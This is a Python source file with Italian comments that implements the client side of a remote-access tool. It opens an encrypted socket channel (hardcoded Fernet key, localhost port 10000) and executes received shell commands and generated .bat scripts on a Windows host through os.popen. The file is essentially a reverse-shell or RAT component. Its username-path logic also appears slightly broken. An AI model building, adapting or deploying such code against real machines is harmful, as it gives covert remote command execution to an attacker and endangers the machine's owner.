#import
import sys
import os
import zlib
import socket
from cryptography.fernet import Fernet

class Connection:

    #variabili globali nella classe
    def __init__(self):
        self.sock = None
        self.stat = False
        self.ip = "127.0.0.1"
        self.port = 10000
        self.criptokey = Fernet(b'PwgEU6_d09vEPRrFpLgtnUf_ixxUxThA94Ma31823iI=')

    #creazione socket e connessione
    def INIT_CONN(self):
        try:
            self.sock = socket.socket()
            self.sock.connect((self.ip, self.port))
            return True
        except:
            return False

    #chiusura connessione
    def CLOSE_CONN(self):
        try:
            self.sock.close()
            return True
        except:
            return False

    #return ip client
    def Ip_Targhet(self):
        try:
            return self.ip
        except:
            return False

    #return port
    def Port(self):
        try:
            return self.port
        except:
            return False

    #return stat connessione (False True)
    def Stat_Conn(self):
        try:
            return self.stat
        except:
            return False

    #invio pacchetti
    def SEND(self, data):
        try:
            data = data.encode()
        except:
            pass
        try:
            #creazione crc32
            crc32 = zlib.crc32(data).to_bytes(6, 'big').replace(b'@', b'a')
            #criptografia del payload
            data = self.criptokey.encrypt(data)
            #creazione pacchetto
            packet = data + b'@' + crc32 + b'@finish'
            #invio pacchetto
            self.sock.send(packet)
            return True
        except:
            return False

    #recezione pacchetti
    def RECV(self):
        try:
            data = b''
            #recezione pacchetti in loop
            while True:
                try:
                    packet = self.sock.recv(4080)
                except:
                    sys.exit()

                #composizione pacchetto
                data = data + packet

                #verifica integrità pacchetto
                if data.split(b'@')[-1] == b'finish':
                    break

            #divisione crc32 e payload
            data = data.split(b'@')
            crc32 = data[-2]
            data.pop(-1)
            data.pop(-1)
            payload = b''
            for index in data:
                payload = payload + index + b'@'
            payload = payload.decode()
            payload = list(payload)
            payload.pop(-1)
            payload = "".join(payload)
            payload = payload.encode()
            payload = self.criptokey.decrypt(payload)
            #verifica validità pacchetto
            if zlib.crc32(payload).to_bytes(6, 'big').replace(b'@', b'a') != crc32:
                return False
            else:
                return payload
        except:
            return False


class Comand():

    #esecuzione comandi
    def EX_COMMAND(self, command):
        try:
            output = os.popen(command).read()
            return output
        except:
            return False

    #esecuzione script
    def EX_SCRIPT(self, code):
        try:
            #salvataggio ed esecuzione dello script .bat
            output = os.popen("whoami").read()
            user = output.split("/")[-1]
            script = open("C:\\Users\\" + user + "\\code.bat", "w+")
            script.write(code)
            script.close()
            output_script = os.popen("C:\\Users\\" + user + "\\code.bat").read()
            os.remove("C:\\Users\\" + user + "\\code.bat")
            return output_script
        except:
            return False